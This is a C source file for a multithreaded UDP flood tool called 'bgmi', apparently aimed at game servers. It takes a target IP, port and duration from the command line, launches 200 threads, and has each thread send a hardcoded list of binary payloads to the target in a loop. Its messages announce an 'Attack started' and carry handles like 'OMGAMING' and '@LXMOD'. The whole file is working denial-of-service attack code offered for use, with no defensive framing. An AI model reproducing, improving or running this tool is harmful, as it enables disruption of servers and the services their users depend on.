#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./bgmi ip port time\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
    "\x34\x79\xB0",
    "\x48\x79\xB0",
    "\x44\x79\xB0",
    "\x58\x79\xB0",
    "\x5C\x79\xB0",
    "\x68\x79\xB0",
    "\x6C\x79\xB0",
    "\x60\x79\xB0",
    "\xA0\x79\x68\x05\x32",
    "\xB0\x79\x56\x05\xC0\xB5",
    "\x20\x78\xAA\x06\x3D\xB4",
    "\x30\x78\x96\x06\x20\xB4",
    "\xD4\x7E\x83\xF8\x93\x48\x33\x24\x28",
    "\xD4\x7E\x83\xF8\x93\x48\x33\x24\x28\x10",
    "\xF0\x7E\x43\xF8\xB3\x4F\xA3\xE4\x8D\xD0\x20",
    "\x3C\x79\xC3\xF8\xB3\x4F\xA3\x84\x01\xD9\x20",
    "\x3C\x79\xC3\xF8\xB3\x4F\xA3\x84\x01\xD9\x20",
    "\xF0\x7E\x43\xF8\xB3\x4F\xA3\xE4\x8D\xD0\x20",  
    "\x48\x78\x9A\x06\x26\x34\x8E\x9A\xCE\xEF\xA3\x19",
    "\xD8\x79\x46\x85\x2B\x4B\xD5\xA7\x12\x05\x64\xEF\x9F\xD1",
    "\x0C\x79\xC3\xF8\x93\x4C\x33\x06\x2A\x02\x04\x94\xDF\x71",
    "\x48\x78\x9A\x06\x26\x34\x8E\x9A\xCE\xEF\xA3\x19",
    "\x0C\x79\xC3\xF8\x93\x4C\x33\x06\x2A\x02\x04\x94\xDF\x71",
    "\xD8\x79\x46\x85\x2B\x4B\xD5\xA7\x12\x05\x64\xEF\x9F\xD1",
    "\x98\x79\x66\x05\xD8\x75\x09\xA5\x20\xD1\x2D\x6C\x9F\xD5\xCB",
    "\x24\x79\x93\xF8\xF3\x43\x2D\xF4\x61\x75\x90\xE5\xF6\x59\x57",
    "\x40\x79\x93\xF8\xF3\x43\x2D\xF4\x61\x75\x90\x2C\xF0\x5D\x57\x75",
    "\x54\x79\x93\xF8\xF3\x43\x2D\xF4\x61\x75\x90\xA7\xF3\x41\x57\x75",
    "\xA8\x79\x83\xF8\xD3\x4D\x4D\xB4\x81\xE3\x09\x5B\xE3\x68\x0A\x75",
    "\xC8\x79\x5A\x05\xC5\x75\x09\xA5\x60\xD1\xCD\x6C\x5F\x25\xD1\x44",
    "\x10\x78\xB4\x06\x37\xB4\x87\xBA\x0E\xD0\xF4\x86\x8B\x84\xBE\x2E\x0C\x69",
    "\x58\x78\x8A\x06\x2E\x34\x8A\xBA\x0E\xD0\xF4\x86\x8B\x84\xBE\x9E\x08\x69",
    "\x50\x78\x8C\x06\x13\xB4\x95\x1A\xC0\xDF\x43\x06\x97\xF1\x54\xEE\x09\x1C\x9A\x22",
    "\x60\x78\xFA\x06\x16\x34\x96\x5A\xC1\xDF\x43\x06\x97\xF1\x54\xEE\x09\x34\x91\x22",
    "\x38\x78\xAC\x06\x23\xB4\x8D\xBA\x0C\xD0\x58\x07\xE8\x9B\x5A\x60\xF7\x4F\x8D\x0E\xFC",
    "\xD0\x79\x4A\x05\xCE\x35\x7A\x5A\xB7\xCF\xA0\x81\xCC\xB1\xDA\xD4\x7C\x3C\x1B\x44\xCD\x1E",
    "\xF4\x79\x93\xF8\xF3\x43\x2D\xF4\x61\x75\x90\xB3\x8F\x4D\xD7\x4C\x2D\x31\x8B\xFD\x58\xFC\x2B\x24",
    "\x68\x78\x8B\xF8\x93\x0D\x51\xA7\xD2\x34\xE4\xCE\x2B\x79\xF8\x77\x2D\x2B\xC9\x8D\x52\x3C\x85\x07\x58",
    "\xD0\x7E\x0B\xFA\x03\x0E\x11\xBB\xF4\xC2\x8C\xCD\x2C\x3A\xB7\xB6\xBD\xE2\x1A\x4D\xC4\x0B\x28\x50\xA3\xF5",
    "\xC0\x79\x8B\xF8\x33\x0D\x51\xA7\xD2\x34\xE4\x4E\x2F\x0C\xE8\xAB\xAA\x70\x89\x03\x68\x49\x65\x86\x56\xF7\x97",
    "\x40\x78\x8B\xF8\xB3\x0D\x51\xA7\xD2\x34\xE4\xCE\x68\x77\x88\x97\xAA\x70\x89\x03\x68\x49\x65\x86\x06\xFB\x97",
    "\x00\x79\x03\xF8\x93\x5C\xBB\xB7\xC8\x90\x16\x09\xE4\xAE\xE6\x26\xDD\xE7\x8B\x1E\x7B\xB1\x4D\x14\x7E\x31\x56\x67\xE7\x76",
    "\x28\x78\xBE\x06\x34\x34\x81\xDA\xCA\x8F\xA1\x81\xCC\xB1\xDA\xD4\x7C\x3C\x1B\xBC\xC0\xF8\x28\x14\x5D\xBE\xD2\xDC\xC6\x76",
    "\xB8\x79\x6E\x05\xDC\x35\x7D\xBA\x0F\xD0\xFC\x8E\x87\xF1\x6C\xE8\x39\x48\x05\xD9\xA9\x18\x68\x1F\x3C\xA6\x02\x6F\xCF\x37\xAE",
    "\x08\x78\x03\xF8\x33\x52\x6B\xB6\xC8\xD0\x4D\x41\x37\x7A\x6D\x4A\x31\xE9\x7B\x22\x48\xE1\x62\xD8\x54\x22\xF4\xF5\x4C\xD6\xAF\xD9",
    "\x9C\x79\x03\xF8\x33\x52\x6B\xB6\xC8\xD0\x4D\xAF\x21\x7A\x55\x3A\x31\xE9\x7B\x22\x48\xC1\x4E\x59\x56\xA2\x94\xF5\xDC\xEA\xAF\x71\x8B\x3F",
    "\xE8\x7E\x83\xF8\x87\xEF\x15\xA5\x08\xD0\xD0\x24\xBF\x21\x1E\x15\x5D\x70\x89\x2E\x18\xEC\x4E\x43\x42\x16\xD7\x5C\xD8\x32\xF9\xC9\x36\x0B\x0D\xA9\x59\x66\xAC\xB2\x5B\x64\x49\x3F\xFE\x58\xD9\xEF\xE5\xE5\xFD\x9A\x95\x27\xE2\x34\x67\x52\x75",
    "\x4C\x79\x83\xF8\x87\xEF\x15\xA5\x08\xD0\xD0\x24\xBF\x21\x1E\x15\x5D\x70\x89\x2E\x18\xEC\x4E\x43\x42\x16\xD7\x5C\xD8\x32\xF9\xC9\x36\x0B\x0D\xA9\x59\x66\xAC\xB2\x5B\x64\x49\x3F\xFE\x58\xD9\xEF\xE5\xE5\xFD\x9A\x95\x27\xE2\x34\xE7\x4E\x76",
    "\xDC\x79\x46\x05\xCF\xB5\x7B\xBA\x0E\xD0\xF4\x86\x8B\x84\xBE\x4E\x38\xF1\x8C\x2E\x30\x68\x9B\x14\x52\x9A\xF5\x72\xB1\x10\xE0\x3A\xB0\xA8\x9E\x7F\x13\xA6\xE1\xE9\x3D\xF4\xBD\xCE\xF3\x14\x2F\x52\xE9\x48\x0D\x94\xC7\x64\x00\x30\x55\xD4\x06\x0A\x4A\xD2",
    "\x1C\x78\x8B\xF8\x73\x0D\x51\xA7\xD2\x34\xE4\x8E\x2E\x71\xF8\x77\x2D\x2B\xC9\x8D\x52\x3C\x45\x04\x94\xF0\x91\x4F\x56\xEB\xAF\xDC\x44\xB2\xFC\x4F\x90\x57\x25\x84\x77\x11\x4E\xB9\x94\x9B\x76\xA3\x35\x7C\xAC\x60\xCF\xE5\x71\x36\xD3\x49\x22\x72\x4C\xCC",
    "\x88\x79\xC3\xF8\x93\x59\x3B\xB5\x28\x99\x08\x91\xEB\xF1\xB3\x46\x2D\x71\x89\x6E\xC8\x18\x28\x14\x5E\xDE\x91\x8B\x66\x6D\xAA\xEF\x30\xDF\x65\x86\xAD\xD1\x5B\xE3\x1B\x1E\x4D\xBF\xDB\x03\x4D\xE3\x52\x7B\x09\x22\x48\x06\x16\x9F\x0A\xBD\x54\x4D\x31\x54\xC9",
    "\x64\x78\xFA\x06\x16\x34\x96\x5A\xC1\xCF\xA5\x81\xCC\xB1\xC0\x34\xA7\x39\x15\x67\x62\x8D\xA9\x11\x54\xD3\x60\xCC\xEF\xB0\xC7\xC7\xFC\x5C\x67\x9A\x85\x51\x56\x89\xBD\x6E\x52\xB8\x96\x5B\xC1\xB0\xE7\x55\xA1\x38\x91\x65\x68\x78\xA6\xCE\x9C\x56\x8B\xD4\xA8",
    "\x2C\x78\xA2\x06\x3A\x34\x80\x9A\xCB\x0F\xA1\x81\xCC\xB1\x93\x34\xA7\x39\x15\x67\xA2\x9F\xF9\xBC\x72\xBB\xC6\xCF\x5E\xB6\xAF\xC0\x1E\x2A\x39\x7F\xD2\x06\x4E\x28\xC8\xEC\x55\x47\xEF\xFA\xF3\x2A\x06\xAD\x41\x4B\xB4\x5D\xDA\x19\xA9\x45\x45\x97\x7A\x1A\xC9\x18",
    "\xA4\x79\x6E\x05\xDC\x75\x0D\xA5\x38\xD2\x0A\x52\x97\x98\xC3\x2C\x3D\x4F\x81\x28\xC8\xAC\xA8\x52\x61\xBB\x1B\xDA\x6E\xB3\xAF\xD7\x01\x87\xF9\x79\x37\x8D\x3C\xBB\xEB\x4B\xAB\x1F\x89\x91\x73\xAF\xDB\x37\x59\x1B\x59\x53\xA9\x8F\x04\x29\x5E\x6A\x28\xDB\xB5\x74\xC0\x0D\x31\x01\x4B\x05\x70\xD0\x02\x8E\x85",
    "\x10\x79\x9B\xF8\xE7\x01\x57\xD5\x00\xD0\x40\x06\xB5\x82\xDF\xEC\x1E\x59\x89\x56\xC8\x18\x28\x6C\xCD\xE8\x02\x80\x6D\x15\xD4\xF6\x02\x07\xB2\x0C\x74\x92\x4A\xE4\xBD\x22\x3E\xDF\x1D\xF6\x5B\x91\xDD\xAE\x33\xB0\xAC\x49\x9B\xE3\x3E\xF5\x97\x35\x4B\xD4\xC8\x1E\x82\x0C\xF5\x56\xA1\xB7\x4A\xEC\x46\x42\xC3\xC3\xD9\x3A\x37\xAA\x1D\xD3\x73\x1C",
    "\xF4\x7E\x03\xF8\xD3\x1A\xDB\xE2\x88\xC0\x43\xDF\xEF\x12\x0B\x35\x68\xB0\xD2\x24\x08\xA4\x8F\x87\x55\x9A\x9D\x58\x92\xA3\x94\xC6\x36\x04\x37\xCC\x40\xAE\x87\x65\x32\xF8\x9E\xAC\xB9\x9B\x91\x13\x57\x82\x42\x8F\x87\x87\x81\x41\x35\xDE\x8C\x16\x71\x1A\x2B\xE4\x12\xB0\x05\xE7\x03\x65\xEA\xD3\xA6\x8F\x83\x7C\xCB\x66\xE8\xA6\xB7\xDD\x59\xDE\x86\xB0\x52\x35\x3C",
    "\x94\x79\x8B\xF8\xF3\x0E\x51\xA7\xD2\x34\xE4\x0E\xEC\x0A\xF8\x77\x2D\x2B\xC9\x8D\x52\x3C\x2D\x1C\x94\xF0\x11\x38\x56\x3F\xAF\xDC\x44\xE6\x42\x50\x5C\x9F\x38\x84\x77\x11\x4E\x79\xF0\x0E\x7F\xA3\x69\x7D\x90\x60\x4F\x11\xC1\x5C\x35\xC6\xA4\x5E\x3B\x62\x6F\x99\x84\x3A\x37\x29\xCC\x07\xEC\xEC\x23\x8F\x83\x7E\x8C\x48\xE8\x8C\x5D\xCB\x9C\xD6\x96\xBC\x76\x35\x3F\x54",
    "\x2C\x79\x83\xF8\x87\xEF\x15\xA5\x08\xD0\xD0\x24\xBF\x21\x1E\x15\x5D\x70\x89\x2E\x18\xEC\x4E\x43\x42\x16\xD7\x5C\xD8\x32\xF9\xC9\x36\x0B\x0D\xA9\x59\x66\xAC\xB2\x5B\x64\x49\x3F\xFE\x58\xD9\xEF\xE5\xE5\xFD\x9A\x95\x27\xE2\x34\xE7\xC0\xB6\x1A\x4B\x3C\x4F\xB1\xC7\x3D\xA5\x14\x74\xAF\x45\xEB\xB3\xEB\x47\x7C\x87\x0B\x82\x1F\x28\xE9\xA1\x55\x71\x01\xD1\xD7\x93\x7E\xE6\x2D\x46\x1F\xF6\x5F\x3E\xEC\x50\x35\x0E\x15\x57\xD9",
    "\xB0\x7E\x9B\xF8\x93\x01\xD1\xA6\x92\x89\x62\x7C\x59\x56\xF7\x74\x2A\x71\x25\xA6\x08\x58\xBA\x88\x56\x76\x90\x4C\xA6\xA7\xA9\xC3\x52\x19\x43\x70\x5C\xD1\x81\xE3\xBC\x22\x4E\xDF\x84\xDA\x74\x7A\xF8\xE3\x4D\x9B\xC7\x63\x43\x10\x54\xBC\xF1\x59\x3D\xB1\x8B\x71\xAF\x7D\x35\x3F\xED\xCF\xA0\xDC\xA6\xDF\xDF\x5C\x58\x83\x62\x26\x56\xDB\xD8\x3E\x5D\x29\x02\x27\xF7\x86\x4D\x71\x02\x3E\xF7\x09\x05\xA9\xB0\x2A\xB4\x1C\x24\xF1\x10\x5A\x20\x8E\x14\x2F\x8B\x6C\x8E\x71\x98\x4E\x24\x35\x78\x9A\x39\xC8\x82\x6F\x77\x74\xC1\x59\xBF\x8F\x3C\x9A\xB5\x01\xB9\xEF\x7D\x9C\x70\x73\x67\x04\xCA\xD7\x7A\xDE\xA1\xBD\x5D\xB2\x3C\x0C\xAD\xCC\x19\x76\x18\x63\xDB\x3E\x2D\x89\x64\x1D\xC3\x28\x7A\xB2\x7A\x62\x17\x2A\x97\x26\xBF\x81\x15\xA1\xB9\x4B",
    "\xF8\x7E\xC3\xF8\x2B\xFB\x12\xA9\x52\xE0\xD8\x00\xCE\x27\xF0\x77\x53\x60\x8F\x2E\xEE\x14\x28\x40\x4C\x3A\x77\xEA\x73\xF7\xCE\xC1\x72\x80\xC9\x7F\x97\xA1\xF2\x85\xED\xA5\x8F\xA3\x05\x42\xF7\xFB\x16\xFE\x71\x9B\x97\x01\x00\x98\xF1\x8E\x22\x1E\x33\x04\xC7\x45\xE1\x6D\xBF\x00\xC3\xEF\xAB\xFA\x25\xD1\x8F\x5A\x0D\xA6\x8D\x60\xDF\x94\x1D\xDD\x06\xAB\x51\x35\x06\x5E\x9B\x55\xED\x52\x4D\x26\x1F\xA4\x47\x23\xB4\x43\x5A\x21\x09\xCA\x5C\x76\x59\x20\x41\xBE\x99\x87\xC8\x10\x24\x73\x8B\x44\x62\x52\x12\x7D\x96\xF3\x73\xE9\x28\xF3\xF0\x25\xB6\x84\x8E\x15\x4C\x94\x3D\x6E\x27\xA9\xB4\xE8\xAC\xB8\x97\x91\xCA\xD5\x56\x4F\x2D\x34\x15\xD2\xDF\x21\x12\x08\x2D\x83\x64\x49\xD8\x28\xFC\xAF\x6E\x50\xBF\x26\xF6\xA8\xB4\x8F\xC5\x8C\xC1\xE7\x01\x9D\xDB\xA9\x8C\x9E\xEF\xAE\x69\x49\xAB\x87\xAA\x11\x11\xA8\x70\x1F\x9C\x3E\x29\xD6\x48\x76\x9B\xC1\xA4\xB4\x9A\xCA\x7D\x78\x67\x45\xF7\x1B\x21\x39\xE8\x0E\xAC\x61\x44\x5F\x67\x81\x6E\xC6\x3B\xFC\xA8\x50\x59\x80\xFA\x08\x5D\x1B\x18\x22\x81\xB6\xDF\x0D\xBD\xC8\xB1\x11\x99\x67\x40\xE0\x0D\x59\x53\xE1\xA0\x53\x12\x5A\xDD\x5A\x69\x51\xD4\x1C\xCE\xEB\x1C\x3E\x36\x9F\xC6\x29\x2C\x8A\xF0\x3D\xF5\x60\x69\x5B\xD6\xB5\xD5\x1F\xE7\xAB\x6A\x58\x77\x05\x61\x29\xD1\xAF\x17\x2E\x4B\xC9\x63\x15\xDA\x47\xC2\x8D\xFE\xED\xF4\x1A\xB4\x32\xCC\xDA\x4B\xB7\x54\x76\xBF\xB4\x8F\x2A\x7B\xF9\x1B\xD6\x75\x51\xE8\x4C\x66\x48\x70\xCE\xC9\xB7\x42\x9E\x7F\x70\x2A\x50\x13\xA8\x19\xB7\xE0\x13\x4E\x9F\xF0\x16\xB3\x82\x86\x4F\x05\xB2\x53\x63\x7E\xD2\x6F\xBD\x54\xB2\x05\x8B\x7B\x12\xF9\x94\x71\x6D\x0F\x43\x71\xE0\x70\x12\xA2\x85\x54\x03\x7D\x9B\x43\xAB\x97\xD6\xE6\x0A\x44\x3F\x7B\xB6\x75\x27\x47\x55\x36\x6C\x8A\xEC\xDA\x87\xA7\xA4\x05\xF8\x2F\x37\xEC\x1D\x0F\x6D\x76\x58\xA1\x38\x87\xEC\x21\xBF\xCC\xDA\x48\x18\x70\xB6\x8C\xC7\x8E\xC8\x29\x23\xEB\x16\xF0\x6E\x76\x04\xB6\xFA\x58\x85\x1C\x31\x51\x6D\xEC\x60\x67\x77\x71\xC0\x47\xB0\xBA\xBD\x85\x50\xE8\x74\xD4\x14\x7B\x16\xE7\x9C\x90\xA4\x74\x4D\x78\x5A\xEC\x27\x21\xDF\x94\x77\xDD\x7E\xB3\x53\x14\x10\x35\x5B\xBF\xB9\xB1\xDD\xEF\xBE\x76\xD2\x1B",
    "\xE4\x7E\xC3\xF8\x2B\xFB\xE2\xAE\xD4\xC7\xE8\x59\xAD\x4F\xF2\x4E\x2F\x79\x79\x23\xD8\x18\x00\x34\x54\x82\xD1\xFB\x81\x2A\xC9\xFF\x54\x8A\xE4\xFF\x56\x95\x4A\xEF\xB9\x39\x46\xA5\x3D\x6E\x7B\xE1\x69\xEC\x42\xE7\xD2\x67\x00\x56\x3D\xCE\xD8\x26\x87\x12\xA8\xD2\x58\x9D\xD4\x0A\xE3\x63\x6B\xAC\xA1\x4E\x8C\xFE\x89\x6E\x8E\x22\xBF\x68\x14\xDC\x59\xB9\x53\xB5\x2B\x5A\xE9\x0B\xC3\xC9\x7B\xB6\x37\x14\xED\x98\xB4\x62\x5E\xDF\x4F\xD6\xFE\x56\x2E\x65\x5E\xCE\x9B\x5B\x71\x18\xDC\x25\x9A\x44\xD6\x70\x8A\x14\x2B\xF9\x97\xEF\xBD\x85\xD1\x69\xBE\xC4\xB6\x94\x9D\xB2\xF2\x34\x6F\x29\xA4\xE8\x28\xF8\x60\xAF\xC8\x6B\x28\x4B\x2D\xC3\x1D\x76\x07\x53\xEF\xB4\xF5\x03\x0B\x9C\x5B\x23\x48\x3C\x72\x03\x9D\x8A\x83\x27\xEF\xE9\x84\xC5\x19\xF8\x5D\x1D\x1C\x11\x8C\xAE\x9E\x9F\xBC\xD5\x9C\x65\x39\x1F\x78\x9A\xA6\x63\x9C\x51\x0C\x3D\x6C\xEF\xD0\x1F\xC8\xAD\xC2\x5B\x6F\x8A\xAE\x52\x17\x9E\x0E\x39\xFC\x53\x64\x5A\xF7\x31\x1B\x1A\xFB\x62\x74\x01\xC1\x7B\x86\xF0\x92\xB6\xF7\x3C\x25\x8C\x0A\xB2\xB8\xF9\xE2\x83\xB5\xF9\xF2\x6E\x20\x3E\x7F\xEB\x45\x24\x02\xE9\x1F\x43\x76\xBD\xD4\x55\x82\x59\xA8\x61\xE0\x27\x97\xA2\x86\x9F\xCA\xA8\x24\xF6\xDC\x80\xD2\x08\xD6\x3D\x72\x97\xD1\x48\x5D\x6C\xC3\xCD\x30\x20\xE5\xA2\x45\x45\xF7\xD3\xDB\x6D\x06\xCC\x2C\x2B\x2F\xA9\x01\x30\xFF\x3B\xE0\x55\x59\x0F\x59\xC3\xB5\x4B\x38\xDD\x90\x77\x68\x9F\xC7\x80\x4D\x57\x43\x9F\x70\x04\xAA\x95\x35\x9F\x62\x75\x81\x77\x2D\xE3\x39\x80\x76\x53\xBC\x70\xDD\x05\x39\xE8\xDA\xDE\xD1\xD0\xC8\x52\x96\x19\x9F\xE4\x62\x62\xFA\xF3\x91\xCF\xA7\xFF\x68\x86\xF2\x44\x62\xD8\x0D\x34\x12\x58\x28\x3C\xD6\xE8\x3A\xCA\xAD\x9F\x2C\x7D\xA9\x22\xA4\x2F\xBF\x2A\xFF\x6B\xE0\x0D\xDD\x3D\x99\x53\xDD\x64\xDA\xFC\x05\x8C\xE5\xA9\x60\xBA\x3A\x44\xE9\x86\x90\x9F\x98\x73\xBE\x48\xBB\xDE\xE7\xB9\xA6\x81\x94\x56\xAE\x22\x84\x59\xB4\x14\xBA\x3E\x4D\x48\x2E\x7B\x07\x92\x70\x61\x33\xB0\x1D\xE8\xBD\x4D\x06\x7C\x67\xBD\xB7\x4E\x87\xD5\x40\xF4\x46\x57\x07\x80\x3A\xF1\x53\x87\x2F\x0D\x9B\x24\xB7\x87\x0E\xE1\xC4\x66\xA7\xF3\x42\x78\xFD\x8C\x24\xF4\xFE\xE0\xEF\x3E\x83\xD9\x1E",
    "\xF8\x7E\xC3\xF8\x2B\xFB\x12\xA9\x52\xE0\xD8\x00\xCE\x27\xF0\x77\x53\x60\x8F\x2E\xEE\x14\x28\x40\x4C\x3A\x77\xEA\x73\xF7\xCE\xC1\x72\x80\xC9\x7F\x97\xA1\xF2\x85\xED\xA5\x8F\xA3\x05\x42\xF7\xFB\x16\xFE\x71\x9B\x97\x01\x00\x98\xF1\x8E\x22\x1E\x33\x04\xC7\x45\xE1\x6D\xBF\x00\xC3\xEF\xAB\xFA\x25\xD1\x8F\x5A\x0D\xA6\x8D\x60\xDF\x94\x1D\xDD\x06\xAB\x51\x35\x06\x5E\x9B\x55\xED\x52\x4D\x26\x1F\xA4\x47\x23\xB4\x43\x5A\x21\x09\xCA\x5C\x76\x59\x20\x41\xBE\x99\x87\xC8\x10\x24\x73\x8B\x44\x62\x52\x12\x7D\x96\xF3\x73\xE9\x28\xF3\xF0\x25\xB6\x84\x8E\x15\x4C\x94\x3D\x6E\x27\xA9\xB4\xE8\xAC\xB8\x97\x91\xCA\xD5\x56\x4F\x2D\x34\x15\xD2\xDF\x21\x12\x08\x2D\x83\x64\x49\xD8\x28\xFC\xAF\x6E\x50\xBF\x26\xF6\xA8\xB4\x8F\xC5\x8C\xC1\xE7\x01\x9D\xDB\xA9\x8C\x9E\xEF\xAE\x69\x49\xAB\x87\xAA\x11\x11\xA8\x70\x1F\x9C\x3E\x29\xD6\x48\x76\x9B\xC1\xA4\xB4\x9A\xCA\x7D\x78\x67\x45\xF7\x1B\x21\x39\xE8\x0E\xAC\x61\x44\x5F\x67\x81\x6E\xC6\x3B\xFC\xA8\x50\x59\x80\xFA\x08\x5D\x1B\x18\x22\x81\xB6\xDF\x0D\xBD\xC8\xB1\x11\x99\x67\x40\xE0\x0D\x59\x53\xE1\xA0\x53\x12\x5A\xDD\x5A\x69\x51\xD4\x1C\xCE\xEB\x1C\x3E\x36\x9F\xC6\x29\x2C\x8A\xF0\x3D\xF5\x60\x69\x5B\xD6\xB5\xD5\x1F\xE7\xAB\x6A\x58\x77\x05\x61\x29\xD1\xAF\x17\x2E\x4B\xC9\x63\x15\xDA\x47\xC2\x8D\xFE\xED\xF4\x1A\xB4\x32\xCC\xDA\x4B\xB7\x54\x76\xBF\xB4\x8F\x2A\x7B\xF9\x1B\xD6\x75\x51\xE8\x4C\x66\x48\x70\xCE\xC9\xB7\x42\x9E\x7F\x70\x2A\x50\x13\xA8\x19\xB7\xE0\x13\x4E\x9F\xF0\x16\xB3\x82\x86\x4F\x05\xB2\x53\x63\x7E\xD2\x6F\xBD\x54\xB2\x05\x8B\x7B\x12\xF9\x94\x71\x6D\x0F\x43\x71\xE0\x70\x12\xA2\x85\x54\x03\x7D\x9B\x43\xAB\x97\xD6\xE6\x0A\x44\x3F\x7B\xB6\x75\x27\x47\x55\x36\x6C\x8A\xEC\xDA\x87\xA7\xA4\x05\xF8\x2F\x37\xEC\x1D\x0F\x6D\x76\x58\xA1\x38\x87\xEC\x21\xBF\xCC\xDA\x48\x18\x70\xB6\x8C\xC7\x8E\xC8\x29\x23\xEB\x16\xF0\x6E\x76\x04\xB6\xFA\x58\x85\x1C\x31\x51\x6D\xEC\x60\x67\x77\x71\xC0\x47\xB0\xBA\xBD\x85\x50\xE8\x74\xD4\x14\x7B\x16\xE7\x9C\x90\xA4\x74\x4D\x78\x5A\xEC\x27\x21\xDF\x94\x77\xDD\x7E\xB3\x53\x14\x10\x35\x5B\xBF\xB9\xB1\xDD\xEF\xBE\x76\xD2\x1B",
"\xAE\xCF\x42\xF3\x64\xB3\x69\x7F\x8B\x33\xA7\x54\x06\xB8\x9C\xCB\x09\x0F\x65\x21\xE3\x44\x13\x71\x60\x35\x9D\x56\x9A\xCC\x29\x97\x03\x85\xE6\xF1\x79\xFF\x02\x20\xC3\xC7\x5A\x1F\xBA\x3E\xA7\x51\x5A\x33\xDF\x67\xEE\xFD\xEF\x03\xF1\xB4\x61\x3D\xF5\x85\x41\xB7\xE3\x3A\xA7\x1C\x19\xFF\x8E\x0F\xF2\x10\x15\x9A\xB8\xA1\x4A\xDA\xBA\xB6\xFA\x7B\xBB\xBD\x73\xBD\xC5\xC1\x75\x08\x81\x2E\x50\x00\xEC\xAF\xB5\xDF\xA4\x9E\xA9\x6A\xA5\xF0\x01\x91\x03\x31\xB1\x04\x24\xAA\x50\x2D\xBE\x6A\xAE\x09\x1D\x93\x93\x96\x0D\x68\x72\x68\x14\xAD\x96\x0B\xFE\xB0\x50\x59\x54\x5C\xA3\xB4\x41\x43\x7D\xDC\x90\xDF\x17\x95\x21\x87\x0B\xDB\x67\x04\x0C\xA5\xC4\x09\x2F\x48\xAA\x17\x10\xF4\x15\x39\x63\x3C\xD1\xD5\x71\x8D\xF8\xC2\x58\xFB\x0C\xBC\x85\x87\x0F\x07\x77\xAD\x8E\x09\xFF\x84\xC0\x15\x51\x39\x4E\xBB\xA5\xD9\x2C\xBE\xEA\x57\x5C\x9B\x0F\x88\x60\xFC\x00\x87\xAD\xCA\xE0\x87\x22\xE4\x9B\xA1\xCA\xAC\x90\xFB\x59\x71\x2A\x57\xD0\x03\x5B\x36\xB1\xF4\x18\x8E\x9D\x34\x72\xA2\xAA\xCA\x76\x8E\x86\xDF\x0E\x37\x9C\x68\xFA\xD7\xD2\x1A\x21\x5F\x8D\xBE\xFF\x67\x89\x92\xE7\x5F\x28\xE6\x8B\xDC\xFC\xA4\x98\x8B\x32\x0C\x6E\xA4\x9A\x4F\x19\x2A\x56\xF8\x11\xB6\x68\xF1\xE6\x08\xCF\x21\x7C\x92\x66\xB3\x34\x85\x0E\xD4\x69\x36\xA8\xDF\xF9\x6D\x9F\x99\x05\x4D\x9E\xA7\x2A\xDC\x03\x4F\x06\x6D\xB4",
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = 200;  // Hardcoded to 200 threads
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: OMGAMING %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished join @LXMOD\n");
    return 0;
}
